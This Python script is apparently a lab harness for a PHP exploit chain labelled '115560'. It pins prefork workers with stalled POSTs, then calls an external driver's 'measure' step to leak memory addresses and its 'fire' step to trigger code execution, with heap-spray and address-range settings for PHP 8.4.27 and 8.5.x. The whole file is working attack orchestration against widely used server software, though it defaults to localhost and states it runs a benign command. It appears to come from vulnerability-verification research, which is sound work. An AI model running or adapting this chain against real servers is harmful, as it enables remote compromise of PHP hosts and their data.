#!/usr/bin/env python3
"""LAB-ONLY action D: run the 115560 chain inside a worker-pinned window.

Thin harness around the unmodified `poc/verify_115560_vardestroy.py` driver.
It imports the driver's `measure`/`fire` functions and runs them while
`php2shell.pinning.WorkerPinner` holds `--holders` stalled POSTs, leaving one
prefork child for the chain.

  pinned   : 7 holders on an 8-worker pool -> measure + fire on the lone free
             child; samples the worker pid before/after to show pairing.
  unpinned : no holders; the fire may land on a different child than measure
             (control for the fork-inherited-main argument).

Fixed benign command; lab targets only.
"""
import argparse
import importlib.util
import os
import secrets
import sys
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from php2shell.pinning import WorkerPinner  # noqa: E402

_DRIVER = os.path.join(ROOT, "poc", "verify_115560_vardestroy.py")


def load_driver():
    spec = importlib.util.spec_from_file_location("vd115560", _DRIVER)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18206")
    ap.add_argument("--container", default="php2shell-115560-8427-workers")
    ap.add_argument("--build", default="8.4.27")
    ap.add_argument("--holders", type=int, default=7)
    ap.add_argument("--mode", choices=["pinned", "unpinned"], default="pinned")
    ap.add_argument("--measure-mode", default="5", choices=["0", "2", "5"])
    ap.add_argument("--fire-mode", default="4", choices=["1", "4"])
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--proof", default="/tmp/vd")
    ap.add_argument("--samples", type=int, default=6)
    args = ap.parse_args()

    VD = load_driver()
    host, _, port = args.target.partition(":")
    port = int(port or 80)
    holders = args.holders if args.mode == "pinned" else 0

    vd_args = argparse.Namespace(
        target=args.target, container=args.container, build=args.build,
        sid=None, bias_zif=0, path=args.path, proof=args.proof,
        measure_mode=args.measure_mode, fire_mode=args.fire_mode,
        main=None, delta=None, lib=None, zif=None, brute=False,
        lib_delta=None, zif_off=None,
        lo=0xFFFF78000000, hi=0xFFFFC0000000, step=0x200000,
        max_attempts=0, ref=1020,
        spray=8135 if args.build.startswith("8.5") else 3048,
    )

    print(f"[*] {args.mode}: holders={holders} target={args.target} "
          f"container={args.container} build={args.build}")

    with WorkerPinner(host, port, holders=holders, path=args.path,
                      verbose=True) as pin:
        before = pin.sample_pids(count=args.samples) if args.mode == "pinned" else []
        print(f"[pin] pre-measure worker samples: {sorted(set(before))}")

        res = VD.measure(host, port, args.container,
                         secrets.token_hex(16), args.build, args.measure_mode)
        if not res and args.measure_mode == "5" and args.fire_mode == "4":
            print("[i] fallback to single mid-parse dtor (8.5.x shape)")
            res = VD.measure(host, port, args.container,
                             secrets.token_hex(16), args.build, "0")
            vd_args.fire_mode = "1"
        if not res:
            print("[!] measure failed")
            return 2

        main_addr, delta, lib, zif, _carrier = res

        after = pin.sample_pids(count=args.samples)
        print(f"[pin] post-measure worker samples: {sorted(set(after))}")
        if args.mode == "pinned":
            if after and len(set(after)) == 1:
                print(f"[pin] lone free worker pid={after[0]}")
            else:
                print(f"[!] pairing not single: {sorted(set(after))}")

        ok = VD.fire(host, port, args.container, secrets.token_hex(16),
                     main_addr, delta, zif, 0, args.proof,
                     vd_args.fire_mode, args.path, vd_args.ref, vd_args.spray)
        print(f"[pin] fire landed on a worker; proof={'YES' if ok else 'no'}")
        if ok:
            print("[EVIDENCE] 115560 chain works under "
                  f"{'worker pinning' if holders else 'unpinned multi-worker'}")
            return 0
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
